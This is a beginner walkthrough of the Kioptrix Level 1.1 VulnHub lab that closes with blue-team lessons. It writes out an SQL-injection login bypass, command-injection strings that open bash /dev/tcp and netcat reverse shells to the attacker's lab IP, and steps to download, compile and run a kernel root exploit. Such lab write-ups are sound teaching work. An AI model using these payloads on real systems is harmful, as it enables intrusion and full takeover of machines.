# Kioptrix: Level 1.1 (#2) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.1 (#2) |
| **Difficulty** | Easy |
| **Author** | loneferret (Kioptrix) |
| **Released** | February 11, 2011 |
| **VulnHub Entry** | [Kioptrix: Level 1.1 (#2) on VulnHub](https://vulnhub.com/entry/kioptrix-level-11-2,23/) |
| **Download** | [Kioptrix: Level 1.1 (#2) OVA](https://vulnhub.com/entry/kioptrix-level-11-2,23/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (CentOS 4.x, kernel 2.6.9-55.EL) |

> This is the second Kioptrix challenge (VulnHub calls it "Level 1.1", sometimes labeled "#2").
> It ships as a VMware image; the target gets its IP by **DHCP**, so the real address may differ.
> This guide uses the example target `192.168.56.101` — substitute whatever your scan finds.

## 0. What you will learn

- **Network discovery:** Finding a DHCP-issued VM on your isolated lab subnet.
- **Port & service enumeration:** Using Nmap to fingerprint an old CentOS/Apache box.
- **SQL injection (authentication bypass):** How a login form can be tricked into logging you in.
- **OS command injection:** How a "ping" web tool that runs a system command can be abused to run *your* command.
- **Getting a reverse shell:** Turning command execution into an interactive shell.
- **Linux privilege escalation:** Using a public kernel exploit to go from a low-privilege user to `root`.
- **Defensive thinking:** Blue-team lessons around input handling, old kernels, and service hardening.

> **A note on difficulty:** "Easy" here means the *concepts* are beginner-level, not that nothing can go wrong. Old VMs are finicky — if a step behaves differently, the box likely just booted slowly or your target IP changed.

## 1. Reconnaissance — finding the target

The Kioptrix VM requests an address via DHCP, so first we find it.

**Check your own attacker IP and interface names:**

```bash
ip a
```

> **How to read it:** Look for your lab interface (often `eth0`, `eth1`, or a `vboxnet`/`vmnet` adapter) and note the subnet, e.g. `192.168.56.0/24` with your Kali at `192.168.56.10`.

**Discover live hosts — Method A: `arp-scan`:**

```bash
sudo arp-scan --localnet
```

**Method B: `netdiscover`:**

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each line is a live host: IP address, MAC address, and often the vendor/hostname. Your Kali is one entry; the Kioptrix box is the *other* Linux-looking entry.
> **Why it works:** ARP asks "who has this IP?" on the local segment, so any host that answers is alive — no ports need to be open.

**Confirm with an Nmap ping sweep (optional):**

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` finds live hosts *without* scanning ports. The line `Nmap scan report for 192.168.56.101` tells you a host is up.
> **Why it works:** This confirms reachability. From here on, this guide uses attacker `192.168.56.10` and target `192.168.56.101`.

![host discovery showing the target](images/01-recon-netdiscover.png)

## 2. Enumeration

With the target IP known, enumerate open ports and versions. For beginners, **this is the single most important phase** — everything exploits what you find here.

### 2.1 Full TCP port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. `--min-rate 1000` sends at least 1000 packets/sec (fine in a lab). `-T4` is an aggressive timing template. `-oA` saves results three ways (`.nmap`, `.gnmap`, `.xml`).
> **Why it works:** This catches services on unusual ports before we waste effort guessing.

### 2.2 Service detection & default scripts

```bash
sudo nmap -sC -sV -p 22,80,111,139,443,445,1024 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's safe default scripts; `-sV` probes each open port for a service banner/version. We narrow to the ports the full scan found.
> **Why it works:** Version banners are what tell us whether something is out of date and likely exploitable.

### 2.3 Realistic expected output for Kioptrix #2

Exact banners vary by build, but a typical result looks like this:

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at [DATE]
Nmap scan report for 192.168.56.101
Host is up (0.0008s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http        Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
```

> **How to read it:** Port **80** runs Apache and, importantly, a PHP web application. Common MySQL (3306) and SMB (139/445) are present too. The old **CentOS / kernel 2.6** build matters later for privilege escalation.
> **Why it works:** The web app is where the intended foothold lives. Confirm the kernel version once you have a shell, because a shell alone is not the goal — `root` is.

**Browse the web server:**

```bash
firefox http://192.168.56.101 &
```

You should see a login page (a "Remote System Administration" style form). Note the page source is sometimes interesting — comments occasionally hint at an `Administrator` account.

![nmap scan of Kioptrix #2](images/02-nmap.png)

## 3. Foothold

The path is two steps: **bypass the login**, then **exploit command injection in the ping tool**.

### 3.1 Step 1 — Authentication bypass via SQL injection

The login form on `index.php` checks your credentials against a SQL query. If the code naively builds the query string, we can break out of it.

In the **username** and/or **password** field, try:

```text
' OR '1'='1
```

or (commenting out the rest of the query):

```text
' OR 1=1 -- -
```

> **How to read it:** A normal query looks like `SELECT * FROM users WHERE username='x' AND password='y'`. Our input closes the quote and adds `OR 1=1`, which is always true, so the query returns a user row and the app logs us in.
> **Why it works:** The application concatenates user input directly into SQL instead of using parameterized queries. This is **SQL injection (SQLi)** — the login page is only the delivery method; the real vulnerability is unsanitized SQL. (The exact payload that works varies slightly by build — `' or '1'='1` and `admin' or 1=1 -- -` are both commonly reported.)

After logging in, you land on a **ping utility**: you enter a hostname/IP and the server runs `ping` for you.

### 3.2 Step 2 — Confirm OS command injection

The obvious guess: the form runs `ping <your-input>` in a shell. If it does not sanitize input, we can append our own command after a shell separator (`;`, `&&`, or `|`).

Type this into the ping field:

```text
127.0.0.1; whoami
```

> **How to read it:** If the page shows something like `apache`, the shell ran **both** `ping 127.0.0.1` *and* `whoami` — our command executed on the server. That is **OS command injection**.
> **Why it works:** `;` separates commands in a shell. The app passed the whole string to the shell instead of treating it as a single hostname.

Confirm more context:

```text
127.0.0.1; id; uname -a
```

Expected output (example):

```text
uid=48(apache) gid=48(apache) groups=48(apache)
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

> **How to read it:** We run as user **`apache`** — an unprivileged web account, *not* root. The kernel is **2.6.9-55.EL** (CentOS). Remember this for privilege escalation.

> **Endpoint note:** The vulnerable form is often reached through the `index.php` login flow and posts to a handler sometimes observed as `pingit.php` (older writeups may call it `ping.php`). The **name of the endpoint varies by build** — what matters is that a web form runs `ping` with unfiltered input.

### 3.3 Get a reverse shell

A "reverse shell" makes the target connect *back* to us, giving us an interactive session.

**First, start a listener on Kali:**

```bash
nc -lvnp 4444
```

> **How to read it:** `nc` is Netcat. `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` on port 4444. Leave this running.

**Then inject a reverse-shell payload into the ping field:**

```text
127.0.0.1; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

> **How to read it:** `bash -i` starts an interactive bash. `/dev/tcp/192.168.56.10/4444` is a Bash feature that opens a TCP connection to *our* listener. `>& ... 0>&1` redirects stdin, stdout and stderr through that connection so commands and output flow both ways.
> **Why it works:** Because we already have command execution on the target, the shell it spawns runs on the target but talks to us over the network.

> **How to read it (listener side):** You should see `connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] ...` followed by a prompt like `bash-3.00$`.

Alternative payload using `nc` if Bash's `/dev/tcp` is blocked:

```text
127.0.0.1; nc -e /bin/bash 192.168.56.10 4444
```

> **Note:** Not every `nc` build supports `-e`. If it fails, use the Bash `/dev/tcp` method above.

**Upgrade to a more usable shell (optional but recommended):**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **How to read it:** This spawns a proper pseudo-terminal, so arrow keys, tab-completion, and interactive programs behave normally.

![command injection and reverse shell](images/03-command-injection-shell.png)

## 4. Privilege escalation

We are `apache`; we need `root`. On an old unpatched kernel, a public local exploit is the intended route.

### 4.1 Identify the kernel

```bash
uname -a
cat /etc/redhat-release 2>/dev/null
```

> **How to read it:** `2.6.9-55.EL` (CentOS 4.x) is decades out of date and has well-known local privilege-escalation vulnerabilities.

### 4.2 Find a matching exploit

On **Kali** (not the target), search Exploit-DB locally:

```bash
searchsploit linux kernel 2.6 centos
searchsploit "Linux Kernel 2.6 < 2.6.19"
```

> **How to read it:** `searchsploit` searches your local Exploit-DB copy. Community writeups for this box commonly use the entries **EDB 9542** and **EDB 9545** — both target `Linux Kernel 2.6 < 2.6.19` on CentOS 4.4/4.5 and are labeled as a ring0 (root) local privilege escalation. The exact file number that works **varies by build**; let `searchsploit` and the exploit's own banner be your source of truth.

> **Why it works:** The kernel fails to validate something in a socket/sendpage code path, letting a local user corrupt kernel memory and execute code as `root`. The public exploit compiles a tiny program that triggers this.

### 4.3 Transfer, compile, and run the exploit

**On Kali, serve the exploit file** (copy it to your web root and start the server):

```bash
cp /usr/share/exploitdb/exploits/linux/local/9542.c .
python3 -m http.server 8000
```

**On the target shell, download and compile it:**

```bash
cd /tmp
wget http://192.168.56.10:8000/9542.c -O 9542.c
gcc -o 9542 9542.c
./9542
```

> **How to read it:** `wget` pulls the file from your Python web server. `gcc -o 9542 9542.c` compiles C source into an executable. Running it prints diagnostics (e.g. `[-] check ur uid`) and, if successful, leaves you at a `#` root prompt.

**Confirm root:**

```bash
id
whoami
```

Expected output:

```text
uid=0(root) gid=0(root) groups=48(apache)
root
```

> **How to read it:** `uid=0(root)` means full control. There is usually **no flag file** on this VM — a root shell *is* the win. Do not invent flag contents; if `/root` is empty, that is normal.

![kernel exploit root shell](images/04-root-shell.png)

### 4.4 Alternative / simpler routes (optional knowledge)

- **Sudo misconfiguration:** If `sudo -l` shows a command your user can run as root without a password, abuse that instead. On many builds `apache` cannot use sudo, so the kernel exploit is the intended path.
- **MySQL:** If you find working MySQL credentials, note that MySQL **running as root** can sometimes write files or (with a UDF library) execute commands as root. This is more common on later Kioptrix levels and is an alternative if the kernel exploit misbehaves.

> **Note:** Don't force an alternative if the kernel exploit already worked — reach for those only if the intended path fails on your specific build.

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| SQL injection (authentication bypass) | N/A (design flaw) | Custom PHP login (`index.php`) | 80 (HTTP) | Bypass login | Unsanitized input concatenated into SQL. |
| OS command injection | N/A (design flaw) | Web "ping" tool (`pingit.php`/form) | 80 (HTTP) | Remote Code Execution as `apache` | Input passed to a shell without filtering. |
| Linux kernel local privilege escalation | See Exploit-DB 9542 / 9545 | Linux Kernel 2.6 < 2.6.19 (CentOS 4.x) | local | Low user → root | Exact EDB ID / CVE varies by build. |
| Unnecessary exposed services | N/A (misconfiguration) | MySQL (3306), SMB (139/445) | 3306, 139, 445 | Increased attack surface | Not required for the intended path. |

> **How to read it:** The chain is web-app flaws for the foothold, then an unpatched kernel for root. Every step is a *missing control*, not a single magic bug.

## 6. Defensive lessons (blue team)

- **Never build SQL by string concatenation.** Use **parameterized queries / prepared statements** so user input can never change the query's meaning. This kills authentication-bypass SQLi at the source.
- **Never pass user input to a shell.** Avoid `system()`/`exec()` for things like "ping a hostname." Use language-native libraries, validate input strictly (e.g. allow only IP-address characters), and never let metacharacters like `;`, `&&`, `|`, `` ` `` reach a shell.
- **Patch and upgrade aggressively.** A 2007-era kernel is a guaranteed root. Track EOL software in an inventory and patch on a schedule.
- **Principle of least privilege for services.** The web app ran as `apache` — good. But the *kernel* bug let that low user become root; keeping the kernel current is what actually contains the blast radius.
- **Reduce surface area.** If MySQL or SMB are not needed, do not expose them. Bind services to localhost and firewall everything else.
- **Detect reverse shells.** Alert on unusual **outbound** connections from servers (a web server should rarely open a shell to an internal host on port 4444). Host firewalls that block outbound traffic to non-standard ports break many reverse shells.
- **Log and monitor web input.** WAFs and request logging that flag SQL keywords or shell metacharacters in form fields give you early warning.

## 7. References

Real community writeups consulted during research (they document the same path):

- [Kioptrix: Level 1.1 (#2) — carmar.is](https://carmar.is/posts/2024/01/kioptrix-1-1/)
- [Kioptrix Level 1.1 (#2) Writeup — Syrion](https://syrion.me/kioptrix-level-1-1-writeup/)
- [Kioptrix Level 1.1 (#2) — shifty0g](https://shifty0g.github.io/posts/kioptrix-level-2/)
- [Kioptrix 1.1 (#2) Writeup — The Hacking Blog](https://thehackingblog.com/2018/07/26/kioptrix-1-1-2-writeup/)
- [Kioptrix Level 1.1 Walkthrough — highon.coffee](https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/)
- [VulnHub Recipe — Kioptrix Level 1.1 (#2)](https://vulnhub.com/entry/kioptrix-level-11-2,23/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap showing port 80 (Apache) and the old CentOS build
- [ ] `images/03-command-injection-shell.png` — `; whoami` injection and the reverse shell
- [ ] `images/04-root-shell.png` — `id`/`whoami` confirming `uid=0(root)` after the kernel exploit
- [ ] `images/05-proof.png` — Optional proof (root shell or `/root` listing)

> **How to read it:** Store screenshots in `labs/kioptrix-level-11-2/images/` and reference them with the relative paths shown.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
